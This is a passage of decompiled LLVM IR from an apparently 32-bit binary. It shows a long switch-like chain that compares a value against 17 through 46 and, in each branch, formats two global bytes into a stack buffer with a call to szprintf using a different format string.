  %v1_8049fbe = zext i8 %v0_8049fbe to i32
  %v2_8049fcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fcd, i32* @ebx, align 4
  %v5_8049fd4 = call i32 @szprintf(i32 %v2_8049fcd, i32 ptrtoint ([14 x i8]* @global_var_8057b73.58 to i32), i32 %v1_8049fbe, i32 %v1_8049fb2)
  br label %dec_label_pc_8049fdc

dec_label_pc_8049fdc:                             ; preds = %dec_label_pc_8049fac, %dec_label_pc_8049fb2
  %v12_8049fdc = icmp eq i32 %v11_8049ca7, 17
  %v1_8049fe0 = icmp eq i1 %v12_8049fdc, false
  br i1 %v1_8049fe0, label %dec_label_pc_804a00c, label %dec_label_pc_8049fe2

dec_label_pc_8049fe2:                             ; preds = %dec_label_pc_8049fdc
  %v0_8049fe2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049fe2 = zext i8 %v0_8049fe2 to i32
  store i32 %v1_8049fe2, i32* @edx, align 4
  %v0_8049fee = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049fee = zext i8 %v0_8049fee to i32
  %v2_8049ffd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ffd, i32* @ebx, align 4
  %v5_804a004 = call i32 @szprintf(i32 %v2_8049ffd, i32 ptrtoint ([13 x i8]* @global_var_8057b81.59 to i32), i32 %v1_8049fee, i32 %v1_8049fe2)
  br label %dec_label_pc_804a00c

dec_label_pc_804a00c:                             ; preds = %dec_label_pc_8049fdc, %dec_label_pc_8049fe2
  %v12_804a00c = icmp eq i32 %v11_8049ca7, 18
  %v1_804a010 = icmp eq i1 %v12_804a00c, false
  br i1 %v1_804a010, label %dec_label_pc_804a03c, label %dec_label_pc_804a012

dec_label_pc_804a012:                             ; preds = %dec_label_pc_804a00c
  %v0_804a012 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a012 = zext i8 %v0_804a012 to i32
  store i32 %v1_804a012, i32* @edx, align 4
  %v0_804a01e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a01e = zext i8 %v0_804a01e to i32
  %v2_804a02d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a02d, i32* @ebx, align 4
  %v5_804a034 = call i32 @szprintf(i32 %v2_804a02d, i32 ptrtoint ([13 x i8]* @global_var_8057b8e.60 to i32), i32 %v1_804a01e, i32 %v1_804a012)
  br label %dec_label_pc_804a03c

dec_label_pc_804a03c:                             ; preds = %dec_label_pc_804a00c, %dec_label_pc_804a012
  %v12_804a03c = icmp eq i32 %v11_8049ca7, 19
  %v1_804a040 = icmp eq i1 %v12_804a03c, false
  br i1 %v1_804a040, label %dec_label_pc_804a06c, label %dec_label_pc_804a042

dec_label_pc_804a042:                             ; preds = %dec_label_pc_804a03c
  %v0_804a042 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a042 = zext i8 %v0_804a042 to i32
  store i32 %v1_804a042, i32* @edx, align 4
  %v0_804a04e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a04e = zext i8 %v0_804a04e to i32
  %v2_804a05d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a05d, i32* @ebx, align 4
  %v5_804a064 = call i32 @szprintf(i32 %v2_804a05d, i32 ptrtoint ([11 x i8]* @global_var_8057b9b.61 to i32), i32 %v1_804a04e, i32 %v1_804a042)
  br label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a03c, %dec_label_pc_804a042
  %v12_804a06c = icmp eq i32 %v11_8049ca7, 20
  %v1_804a070 = icmp eq i1 %v12_804a06c, false
  br i1 %v1_804a070, label %dec_label_pc_804a09c, label %dec_label_pc_804a072

dec_label_pc_804a072:                             ; preds = %dec_label_pc_804a06c
  %v0_804a072 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a072 = zext i8 %v0_804a072 to i32
  store i32 %v1_804a072, i32* @edx, align 4
  %v0_804a07e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a07e = zext i8 %v0_804a07e to i32
  %v2_804a08d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a08d, i32* @ebx, align 4
  %v5_804a094 = call i32 @szprintf(i32 %v2_804a08d, i32 ptrtoint ([12 x i8]* @global_var_8057ba6.62 to i32), i32 %v1_804a07e, i32 %v1_804a072)
  br label %dec_label_pc_804a09c

dec_label_pc_804a09c:                             ; preds = %dec_label_pc_804a06c, %dec_label_pc_804a072
  %v12_804a09c = icmp eq i32 %v11_8049ca7, 21
  %v1_804a0a0 = icmp eq i1 %v12_804a09c, false
  br i1 %v1_804a0a0, label %dec_label_pc_804a0cc, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a09c
  %v0_804a0a2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a0a2 = zext i8 %v0_804a0a2 to i32
  store i32 %v1_804a0a2, i32* @edx, align 4
  %v0_804a0ae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a0ae = zext i8 %v0_804a0ae to i32
  %v2_804a0bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0bd, i32* @ebx, align 4
  %v5_804a0c4 = call i32 @szprintf(i32 %v2_804a0bd, i32 ptrtoint ([14 x i8]* @global_var_8057bb2.63 to i32), i32 %v1_804a0ae, i32 %v1_804a0a2)
  br label %dec_label_pc_804a0cc

dec_label_pc_804a0cc:                             ; preds = %dec_label_pc_804a09c, %dec_label_pc_804a0a2
  %v12_804a0cc = icmp eq i32 %v11_8049ca7, 22
  %v1_804a0d0 = icmp eq i1 %v12_804a0cc, false
  br i1 %v1_804a0d0, label %dec_label_pc_804a0fc, label %dec_label_pc_804a0d2

dec_label_pc_804a0d2:                             ; preds = %dec_label_pc_804a0cc
  %v0_804a0d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a0d2 = zext i8 %v0_804a0d2 to i32
  store i32 %v1_804a0d2, i32* @edx, align 4
  %v0_804a0de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a0de = zext i8 %v0_804a0de to i32
  %v2_804a0ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ed, i32* @ebx, align 4
  %v5_804a0f4 = call i32 @szprintf(i32 %v2_804a0ed, i32 ptrtoint ([12 x i8]* @global_var_8057bc0.64 to i32), i32 %v1_804a0de, i32 %v1_804a0d2)
  br label %dec_label_pc_804a0fc

dec_label_pc_804a0fc:                             ; preds = %dec_label_pc_804a0cc, %dec_label_pc_804a0d2
  %v12_804a0fc = icmp eq i32 %v11_8049ca7, 23
  %v1_804a100 = icmp eq i1 %v12_804a0fc, false
  br i1 %v1_804a100, label %dec_label_pc_804a12c, label %dec_label_pc_804a102

dec_label_pc_804a102:                             ; preds = %dec_label_pc_804a0fc
  %v0_804a102 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a102 = zext i8 %v0_804a102 to i32
  store i32 %v1_804a102, i32* @edx, align 4
  %v0_804a10e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a10e = zext i8 %v0_804a10e to i32
  %v2_804a11d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a11d, i32* @ebx, align 4
  %v5_804a124 = call i32 @szprintf(i32 %v2_804a11d, i32 ptrtoint ([12 x i8]* @global_var_8057bcc.65 to i32), i32 %v1_804a10e, i32 %v1_804a102)
  br label %dec_label_pc_804a12c

dec_label_pc_804a12c:                             ; preds = %dec_label_pc_804a0fc, %dec_label_pc_804a102
  %v12_804a12c = icmp eq i32 %v11_8049ca7, 24
  %v1_804a130 = icmp eq i1 %v12_804a12c, false
  br i1 %v1_804a130, label %dec_label_pc_804a15c, label %dec_label_pc_804a132

dec_label_pc_804a132:                             ; preds = %dec_label_pc_804a12c
  %v0_804a132 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a132 = zext i8 %v0_804a132 to i32
  store i32 %v1_804a132, i32* @edx, align 4
  %v0_804a13e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a13e = zext i8 %v0_804a13e to i32
  %v2_804a14d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14d, i32* @ebx, align 4
  %v5_804a154 = call i32 @szprintf(i32 %v2_804a14d, i32 ptrtoint ([13 x i8]* @global_var_8057bd8.66 to i32), i32 %v1_804a13e, i32 %v1_804a132)
  br label %dec_label_pc_804a15c

dec_label_pc_804a15c:                             ; preds = %dec_label_pc_804a12c, %dec_label_pc_804a132
  %v12_804a15c = icmp eq i32 %v11_8049ca7, 25
  %v1_804a160 = icmp eq i1 %v12_804a15c, false
  br i1 %v1_804a160, label %dec_label_pc_804a18c, label %dec_label_pc_804a162

dec_label_pc_804a162:                             ; preds = %dec_label_pc_804a15c
  %v0_804a162 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a162 = zext i8 %v0_804a162 to i32
  store i32 %v1_804a162, i32* @edx, align 4
  %v0_804a16e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a16e = zext i8 %v0_804a16e to i32
  %v2_804a17d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a17d, i32* @ebx, align 4
  %v5_804a184 = call i32 @szprintf(i32 %v2_804a17d, i32 ptrtoint ([13 x i8]* @global_var_8057be5.67 to i32), i32 %v1_804a16e, i32 %v1_804a162)
  br label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a15c, %dec_label_pc_804a162
  %v12_804a18c = icmp eq i32 %v11_8049ca7, 26
  %v1_804a190 = icmp eq i1 %v12_804a18c, false
  br i1 %v1_804a190, label %dec_label_pc_804a1bc, label %dec_label_pc_804a192

dec_label_pc_804a192:                             ; preds = %dec_label_pc_804a18c
  %v0_804a192 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a192 = zext i8 %v0_804a192 to i32
  store i32 %v1_804a192, i32* @edx, align 4
  %v0_804a19e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a19e = zext i8 %v0_804a19e to i32
  %v2_804a1ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ad, i32* @ebx, align 4
  %v5_804a1b4 = call i32 @szprintf(i32 %v2_804a1ad, i32 ptrtoint ([13 x i8]* @global_var_8057bf2.68 to i32), i32 %v1_804a19e, i32 %v1_804a192)
  br label %dec_label_pc_804a1bc

dec_label_pc_804a1bc:                             ; preds = %dec_label_pc_804a18c, %dec_label_pc_804a192
  %v12_804a1bc = icmp eq i32 %v11_8049ca7, 27
  %v1_804a1c0 = icmp eq i1 %v12_804a1bc, false
  br i1 %v1_804a1c0, label %dec_label_pc_804a1ec, label %dec_label_pc_804a1c2

dec_label_pc_804a1c2:                             ; preds = %dec_label_pc_804a1bc
  %v0_804a1c2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a1c2 = zext i8 %v0_804a1c2 to i32
  store i32 %v1_804a1c2, i32* @edx, align 4
  %v0_804a1ce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a1ce = zext i8 %v0_804a1ce to i32
  %v2_804a1dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1dd, i32* @ebx, align 4
  %v5_804a1e4 = call i32 @szprintf(i32 %v2_804a1dd, i32 ptrtoint ([14 x i8]* @global_var_8057bff.69 to i32), i32 %v1_804a1ce, i32 %v1_804a1c2)
  br label %dec_label_pc_804a1ec

dec_label_pc_804a1ec:                             ; preds = %dec_label_pc_804a1bc, %dec_label_pc_804a1c2
  %v12_804a1ec = icmp eq i32 %v11_8049ca7, 28
  %v1_804a1f0 = icmp eq i1 %v12_804a1ec, false
  br i1 %v1_804a1f0, label %dec_label_pc_804a21c, label %dec_label_pc_804a1f2

dec_label_pc_804a1f2:                             ; preds = %dec_label_pc_804a1ec
  %v0_804a1f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a1f2 = zext i8 %v0_804a1f2 to i32
  store i32 %v1_804a1f2, i32* @edx, align 4
  %v0_804a1fe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a1fe = zext i8 %v0_804a1fe to i32
  %v2_804a20d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20d, i32* @ebx, align 4
  %v5_804a214 = call i32 @szprintf(i32 %v2_804a20d, i32 ptrtoint ([14 x i8]* @global_var_8057c0d.70 to i32), i32 %v1_804a1fe, i32 %v1_804a1f2)
  br label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a1ec, %dec_label_pc_804a1f2
  %v12_804a21c = icmp eq i32 %v11_8049ca7, 29
  %v1_804a220 = icmp eq i1 %v12_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a24c, label %dec_label_pc_804a222

dec_label_pc_804a222:                             ; preds = %dec_label_pc_804a21c
  %v0_804a222 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a222 = zext i8 %v0_804a222 to i32
  store i32 %v1_804a222, i32* @edx, align 4
  %v0_804a22e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a22e = zext i8 %v0_804a22e to i32
  %v2_804a23d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a23d, i32* @ebx, align 4
  %v5_804a244 = call i32 @szprintf(i32 %v2_804a23d, i32 ptrtoint ([12 x i8]* @global_var_8057c1b.71 to i32), i32 %v1_804a22e, i32 %v1_804a222)
  br label %dec_label_pc_804a24c

dec_label_pc_804a24c:                             ; preds = %dec_label_pc_804a21c, %dec_label_pc_804a222
  %v12_804a24c = icmp eq i32 %v11_8049ca7, 30
  %v1_804a250 = icmp eq i1 %v12_804a24c, false
  br i1 %v1_804a250, label %dec_label_pc_804a27c, label %dec_label_pc_804a252

dec_label_pc_804a252:                             ; preds = %dec_label_pc_804a24c
  %v0_804a252 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a252 = zext i8 %v0_804a252 to i32
  store i32 %v1_804a252, i32* @edx, align 4
  %v0_804a25e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a25e = zext i8 %v0_804a25e to i32
  %v2_804a26d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26d, i32* @ebx, align 4
  %v5_804a274 = call i32 @szprintf(i32 %v2_804a26d, i32 ptrtoint ([13 x i8]* @global_var_8057c27.72 to i32), i32 %v1_804a25e, i32 %v1_804a252)
  br label %dec_label_pc_804a27c

dec_label_pc_804a27c:                             ; preds = %dec_label_pc_804a24c, %dec_label_pc_804a252
  %v12_804a27c = icmp eq i32 %v11_8049ca7, 31
  %v1_804a280 = icmp eq i1 %v12_804a27c, false
  br i1 %v1_804a280, label %dec_label_pc_804a2ac, label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a27c
  %v0_804a282 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a282 = zext i8 %v0_804a282 to i32
  store i32 %v1_804a282, i32* @edx, align 4
  %v0_804a28e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a28e = zext i8 %v0_804a28e to i32
  %v2_804a29d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29d, i32* @ebx, align 4
  %v5_804a2a4 = call i32 @szprintf(i32 %v2_804a29d, i32 ptrtoint ([12 x i8]* @global_var_8057c34.73 to i32), i32 %v1_804a28e, i32 %v1_804a282)
  br label %dec_label_pc_804a2ac

dec_label_pc_804a2ac:                             ; preds = %dec_label_pc_804a27c, %dec_label_pc_804a282
  %v9_804a2ac = icmp eq i32 %v11_8049ca7, 32
  %v1_804a2b0 = icmp eq i1 %v9_804a2ac, false
  br i1 %v1_804a2b0, label %dec_label_pc_804a2dc, label %dec_label_pc_804a2b2

dec_label_pc_804a2b2:                             ; preds = %dec_label_pc_804a2ac
  %v0_804a2b2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a2b2 = zext i8 %v0_804a2b2 to i32
  store i32 %v1_804a2b2, i32* @edx, align 4
  %v0_804a2be = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a2be = zext i8 %v0_804a2be to i32
  %v2_804a2cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2cd, i32* @ebx, align 4
  %v5_804a2d4 = call i32 @szprintf(i32 %v2_804a2cd, i32 ptrtoint ([11 x i8]* @global_var_8057c40.74 to i32), i32 %v1_804a2be, i32 %v1_804a2b2)
  br label %dec_label_pc_804a2dc

dec_label_pc_804a2dc:                             ; preds = %dec_label_pc_804a2ac, %dec_label_pc_804a2b2
  %v12_804a2dc = icmp eq i32 %v11_8049ca7, 33
  %v1_804a2e0 = icmp eq i1 %v12_804a2dc, false
  br i1 %v1_804a2e0, label %dec_label_pc_804a30c, label %dec_label_pc_804a2e2

dec_label_pc_804a2e2:                             ; preds = %dec_label_pc_804a2dc
  %v0_804a2e2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a2e2 = zext i8 %v0_804a2e2 to i32
  store i32 %v1_804a2e2, i32* @edx, align 4
  %v0_804a2ee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a2ee = zext i8 %v0_804a2ee to i32
  %v2_804a2fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fd, i32* @ebx, align 4
  %v5_804a304 = call i32 @szprintf(i32 %v2_804a2fd, i32 ptrtoint ([12 x i8]* @global_var_8057c4b.75 to i32), i32 %v1_804a2ee, i32 %v1_804a2e2)
  br label %dec_label_pc_804a30c

dec_label_pc_804a30c:                             ; preds = %dec_label_pc_804a2dc, %dec_label_pc_804a2e2
  %v12_804a30c = icmp eq i32 %v11_8049ca7, 34
  %v1_804a310 = icmp eq i1 %v12_804a30c, false
  br i1 %v1_804a310, label %dec_label_pc_804a33c, label %dec_label_pc_804a312

dec_label_pc_804a312:                             ; preds = %dec_label_pc_804a30c
  %v0_804a312 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a312 = zext i8 %v0_804a312 to i32
  store i32 %v1_804a312, i32* @edx, align 4
  %v0_804a31e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a31e = zext i8 %v0_804a31e to i32
  %v2_804a32d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a32d, i32* @ebx, align 4
  %v5_804a334 = call i32 @szprintf(i32 %v2_804a32d, i32 ptrtoint ([12 x i8]* @global_var_8057c57.76 to i32), i32 %v1_804a31e, i32 %v1_804a312)
  br label %dec_label_pc_804a33c

dec_label_pc_804a33c:                             ; preds = %dec_label_pc_804a30c, %dec_label_pc_804a312
  %v12_804a33c = icmp eq i32 %v11_8049ca7, 35
  %v1_804a340 = icmp eq i1 %v12_804a33c, false
  br i1 %v1_804a340, label %dec_label_pc_804a36c, label %dec_label_pc_804a342

dec_label_pc_804a342:                             ; preds = %dec_label_pc_804a33c
  %v0_804a342 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a342 = zext i8 %v0_804a342 to i32
  store i32 %v1_804a342, i32* @edx, align 4
  %v0_804a34e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a34e = zext i8 %v0_804a34e to i32
  %v2_804a35d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a35d, i32* @ebx, align 4
  %v5_804a364 = call i32 @szprintf(i32 %v2_804a35d, i32 ptrtoint ([12 x i8]* @global_var_8057c63.77 to i32), i32 %v1_804a34e, i32 %v1_804a342)
  br label %dec_label_pc_804a36c

dec_label_pc_804a36c:                             ; preds = %dec_label_pc_804a33c, %dec_label_pc_804a342
  %v12_804a36c = icmp eq i32 %v11_8049ca7, 36
  %v1_804a370 = icmp eq i1 %v12_804a36c, false
  br i1 %v1_804a370, label %dec_label_pc_804a39c, label %dec_label_pc_804a372

dec_label_pc_804a372:                             ; preds = %dec_label_pc_804a36c
  %v0_804a372 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a372 = zext i8 %v0_804a372 to i32
  store i32 %v1_804a372, i32* @edx, align 4
  %v0_804a37e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a37e = zext i8 %v0_804a37e to i32
  %v2_804a38d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a38d, i32* @ebx, align 4
  %v5_804a394 = call i32 @szprintf(i32 %v2_804a38d, i32 ptrtoint ([12 x i8]* @global_var_8057c6f.78 to i32), i32 %v1_804a37e, i32 %v1_804a372)
  br label %dec_label_pc_804a39c

dec_label_pc_804a39c:                             ; preds = %dec_label_pc_804a36c, %dec_label_pc_804a372
  %v12_804a39c = icmp eq i32 %v11_8049ca7, 37
  %v1_804a3a0 = icmp eq i1 %v12_804a39c, false
  br i1 %v1_804a3a0, label %dec_label_pc_804a3cc, label %dec_label_pc_804a3a2

dec_label_pc_804a3a2:                             ; preds = %dec_label_pc_804a39c
  %v0_804a3a2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a3a2 = zext i8 %v0_804a3a2 to i32
  store i32 %v1_804a3a2, i32* @edx, align 4
  %v0_804a3ae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a3ae = zext i8 %v0_804a3ae to i32
  %v2_804a3bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3bd, i32* @ebx, align 4
  %v5_804a3c4 = call i32 @szprintf(i32 %v2_804a3bd, i32 ptrtoint ([12 x i8]* @global_var_8057c7b.79 to i32), i32 %v1_804a3ae, i32 %v1_804a3a2)
  br label %dec_label_pc_804a3cc

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a39c, %dec_label_pc_804a3a2
  %v12_804a3cc = icmp eq i32 %v11_8049ca7, 38
  %v1_804a3d0 = icmp eq i1 %v12_804a3cc, false
  br i1 %v1_804a3d0, label %dec_label_pc_804a3fc, label %dec_label_pc_804a3d2

dec_label_pc_804a3d2:                             ; preds = %dec_label_pc_804a3cc
  %v0_804a3d2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a3d2 = zext i8 %v0_804a3d2 to i32
  store i32 %v1_804a3d2, i32* @edx, align 4
  %v0_804a3de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a3de = zext i8 %v0_804a3de to i32
  %v2_804a3ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ed, i32* @ebx, align 4
  %v5_804a3f4 = call i32 @szprintf(i32 %v2_804a3ed, i32 ptrtoint ([13 x i8]* @global_var_8057c87.80 to i32), i32 %v1_804a3de, i32 %v1_804a3d2)
  br label %dec_label_pc_804a3fc

dec_label_pc_804a3fc:                             ; preds = %dec_label_pc_804a3cc, %dec_label_pc_804a3d2
  %v12_804a3fc = icmp eq i32 %v11_8049ca7, 39
  %v1_804a400 = icmp eq i1 %v12_804a3fc, false
  br i1 %v1_804a400, label %dec_label_pc_804a42c, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3fc
  %v0_804a402 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a402 = zext i8 %v0_804a402 to i32
  store i32 %v1_804a402, i32* @edx, align 4
  %v0_804a40e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a40e = zext i8 %v0_804a40e to i32
  %v2_804a41d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41d, i32* @ebx, align 4
  %v5_804a424 = call i32 @szprintf(i32 %v2_804a41d, i32 ptrtoint ([13 x i8]* @global_var_8057c94.81 to i32), i32 %v1_804a40e, i32 %v1_804a402)
  br label %dec_label_pc_804a42c

dec_label_pc_804a42c:                             ; preds = %dec_label_pc_804a3fc, %dec_label_pc_804a402
  %v12_804a42c = icmp eq i32 %v11_8049ca7, 40
  %v1_804a430 = icmp eq i1 %v12_804a42c, false
  br i1 %v1_804a430, label %dec_label_pc_804a45c, label %dec_label_pc_804a432

dec_label_pc_804a432:                             ; preds = %dec_label_pc_804a42c
  %v0_804a432 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a432 = zext i8 %v0_804a432 to i32
  store i32 %v1_804a432, i32* @edx, align 4
  %v0_804a43e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a43e = zext i8 %v0_804a43e to i32
  %v2_804a44d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44d, i32* @ebx, align 4
  %v5_804a454 = call i32 @szprintf(i32 %v2_804a44d, i32 ptrtoint ([13 x i8]* @global_var_8057c87.80 to i32), i32 %v1_804a43e, i32 %v1_804a432)
  br label %dec_label_pc_804a45c

dec_label_pc_804a45c:                             ; preds = %dec_label_pc_804a42c, %dec_label_pc_804a432
  %v12_804a45c = icmp eq i32 %v11_8049ca7, 41
  %v1_804a460 = icmp eq i1 %v12_804a45c, false
  br i1 %v1_804a460, label %dec_label_pc_804a48c, label %dec_label_pc_804a462

dec_label_pc_804a462:                             ; preds = %dec_label_pc_804a45c
  %v0_804a462 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a462 = zext i8 %v0_804a462 to i32
  store i32 %v1_804a462, i32* @edx, align 4
  %v0_804a46e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a46e = zext i8 %v0_804a46e to i32
  %v2_804a47d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a47d, i32* @ebx, align 4
  %v5_804a484 = call i32 @szprintf(i32 %v2_804a47d, i32 ptrtoint ([13 x i8]* @global_var_8057ca1.82 to i32), i32 %v1_804a46e, i32 %v1_804a462)
  br label %dec_label_pc_804a48c

dec_label_pc_804a48c:                             ; preds = %dec_label_pc_804a45c, %dec_label_pc_804a462
  %v12_804a48c = icmp eq i32 %v11_8049ca7, 42
  %v1_804a490 = icmp eq i1 %v12_804a48c, false
  br i1 %v1_804a490, label %dec_label_pc_804a4bc, label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a48c
  %v0_804a492 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a492 = zext i8 %v0_804a492 to i32
  store i32 %v1_804a492, i32* @edx, align 4
  %v0_804a49e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a49e = zext i8 %v0_804a49e to i32
  %v2_804a4ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ad, i32* @ebx, align 4
  %v5_804a4b4 = call i32 @szprintf(i32 %v2_804a4ad, i32 ptrtoint ([13 x i8]* @global_var_8057cae.83 to i32), i32 %v1_804a49e, i32 %v1_804a492)
  br label %dec_label_pc_804a4bc

dec_label_pc_804a4bc:                             ; preds = %dec_label_pc_804a48c, %dec_label_pc_804a492
  %v12_804a4bc = icmp eq i32 %v11_8049ca7, 43
  %v1_804a4c0 = icmp eq i1 %v12_804a4bc, false
  br i1 %v1_804a4c0, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4c2

dec_label_pc_804a4c2:                             ; preds = %dec_label_pc_804a4bc
  %v0_804a4c2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a4c2 = zext i8 %v0_804a4c2 to i32
  store i32 %v1_804a4c2, i32* @edx, align 4
  %v0_804a4ce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a4ce = zext i8 %v0_804a4ce to i32
  %v2_804a4dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4dd, i32* @ebx, align 4
  %v5_804a4e4 = call i32 @szprintf(i32 %v2_804a4dd, i32 ptrtoint ([13 x i8]* @global_var_8057cbb.84 to i32), i32 %v1_804a4ce, i32 %v1_804a4c2)
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a4bc, %dec_label_pc_804a4c2
  %v12_804a4ec = icmp eq i32 %v11_8049ca7, 44
  %v1_804a4f0 = icmp eq i1 %v12_804a4ec, false
  br i1 %v1_804a4f0, label %dec_label_pc_804a51c, label %dec_label_pc_804a4f2

dec_label_pc_804a4f2:                             ; preds = %dec_label_pc_804a4ec
  %v0_804a4f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a4f2 = zext i8 %v0_804a4f2 to i32
  store i32 %v1_804a4f2, i32* @edx, align 4
  %v0_804a4fe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a4fe = zext i8 %v0_804a4fe to i32
  %v2_804a50d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a50d, i32* @ebx, align 4
  %v5_804a514 = call i32 @szprintf(i32 %v2_804a50d, i32 ptrtoint ([13 x i8]* @global_var_8057cae.83 to i32), i32 %v1_804a4fe, i32 %v1_804a4f2)
  br label %dec_label_pc_804a51c

dec_label_pc_804a51c:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804a4f2
  %v12_804a51c = icmp eq i32 %v11_8049ca7, 45
  %v1_804a520 = icmp eq i1 %v12_804a51c, false
  br i1 %v1_804a520, label %dec_label_pc_804a54c, label %dec_label_pc_804a522

dec_label_pc_804a522:                             ; preds = %dec_label_pc_804a51c
  %v0_804a522 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a522 = zext i8 %v0_804a522 to i32
  store i32 %v1_804a522, i32* @edx, align 4
  %v0_804a52e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a52e = zext i8 %v0_804a52e to i32
  %v2_804a53d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a53d, i32* @ebx, align 4
  %v5_804a544 = call i32 @szprintf(i32 %v2_804a53d, i32 ptrtoint ([13 x i8]* @global_var_8057cc8.85 to i32), i32 %v1_804a52e, i32 %v1_804a522)
  br label %dec_label_pc_804a54c

dec_label_pc_804a54c:                             ; preds = %dec_label_pc_804a51c, %dec_label_pc_804a522
  %v12_804a54c = icmp eq i32 %v11_8049ca7, 46
  %v1_804a550 = icmp eq i1 %v12_804a54c, false
  br i1 %v1_804a550, label %dec_label_pc_804a57c, label %dec_label_pc_804a552

dec_label_pc_804a552:                             ; preds = %dec_label_pc_804a54c
